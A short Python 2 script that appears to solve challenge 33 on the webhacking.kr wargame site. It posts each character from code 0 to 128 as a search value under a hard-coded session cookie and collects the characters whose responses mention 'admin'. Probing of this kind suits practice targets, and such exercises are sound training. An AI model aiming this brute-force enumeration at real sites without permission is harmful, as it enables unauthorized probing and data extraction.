import requests

url='http://webhacking.kr/challenge/web/web-33/index.php'
cookies={'PHPSESSID':'1gvdu8mjh0miihv90idtg3djj3'}


result=''
for i in xrange(129):
	data={'search':chr(i)}
	response=requests.post(url, data=data, cookies=cookies)
	if 'admin' in response.text:
		result=result + str(chr(i))

print result
